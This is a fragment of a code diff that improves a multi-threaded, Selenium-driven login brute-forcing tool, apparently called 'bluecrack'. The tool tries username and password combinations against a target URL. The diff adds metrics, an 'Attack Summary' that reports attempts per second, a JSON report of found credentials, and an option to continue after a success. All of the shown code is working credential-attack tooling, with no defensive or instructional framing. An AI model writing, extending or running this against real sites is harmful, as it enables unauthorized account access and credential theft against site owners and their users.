+                            print(f"{_RED}[-] Could not save credential: {e}{_RESET}")
 
-                        # Clear the queue so other threads stop grabbing new combos
-                        with q.mutex:
-                            q.queue.clear()
+                        if not CONTINUE_AFTER_SUCCESS:
+                            _FOUND_EVENT.set()
+                            with q.mutex:
+                                q.queue.clear()
+                            break
+                    else:
+                        with _cli_metrics_lock:
+                            _cli_metrics["failures"] += 1
 
-                    break
                 except (NoSuchElementException, WebDriverException) as e:
+                    with _cli_metrics_lock:
+                        _cli_metrics["errors"] += 1
                     print(
-                        f"[-] Error during attempt with '{user} / {pwd}': element not found or page not loaded properly."
+                        f"{_RED}[-] Error during attempt with '{user} / {pwd}': element not found or page not loaded properly.{_RESET}"
                     )
             except Exception as e:
-                print(f"[-] Navigation or unexpected error: {e}")
+                with _cli_metrics_lock:
+                    _cli_metrics["errors"] += 1
+                print(f"{_RED}[-] Navigation or unexpected error: {e}{_RESET}")
             finally:
                 q.task_done()
     finally:
         try:
             thread_driver.quit()
-        except:
+        except Exception:
             pass
 
 
 # Close the initial setup driver
 try:
     driver.quit()
-except:
+except Exception:
     pass
 
 # THREAD LAUNCHER
-threads = []
+threads_list: List[threading.Thread] = []
 print(f"\n[*] Starting {THREADS} threads...\n")
 try:
     for _ in range(THREADS):
         t = threading.Thread(target=worker)
         t.daemon = True
         t.start()
-        threads.append(t)
+        threads_list.append(t)
 
     # Wait for completion
-    while not q.empty() and not found and not _GLOBAL_STOP.is_set():
+    while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
         time.sleep(0.1)
 
-    if not found:
+    if not _FOUND_EVENT.is_set():
         q.join()
 
-    if not found:
-        print("\n[-] Finished testing. No valid credentials found.")
+    cli_end_time = time.time()
+
+    if not _FOUND_EVENT.is_set():
+        print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
     else:
-        print("\n[+] Finished testing. Valid credentials found!")
+        print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")
+
+    # Print summary
+    print(f"\n{_CYAN}═══ Attack Summary ═══{_RESET}")
+    for k, v in _cli_metrics.items():
+        print(f"  {k}: {v}")
+    elapsed = cli_end_time - _cli_start_time
+    print(f"  elapsed: {elapsed:.1f}s")
+    if _cli_metrics["attempted"] > 0 and elapsed > 0:
+        print(f"  speed: {_cli_metrics['attempted'] / elapsed:.1f} attempts/s")
+
+    # Save JSON report if requested
+    if JSON_REPORT:
+        _save_json_report(
+            "bluecrack_cli_report.json",
+            TARGET_URL,
+            _cli_metrics,
+            _cli_found_creds,
+            _cli_start_time,
+            cli_end_time,
+        )
+        print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")
+
 except KeyboardInterrupt:
-    print("\n[!] Interrupted by user (Ctrl+C). Exiting gracefully...")
-    found = True
+    print(f"\n{_YELLOW}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{_RESET}")
+    _FOUND_EVENT.set()
     _GLOBAL_STOP.set()
 finally:
-    if _GLOBAL_STOP.is_set() and not found:
-        print("\n[!] Stopped by signal. Cleaning up...")
+    if _GLOBAL_STOP.is_set() and not _FOUND_EVENT.is_set():
+        print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")
     pass
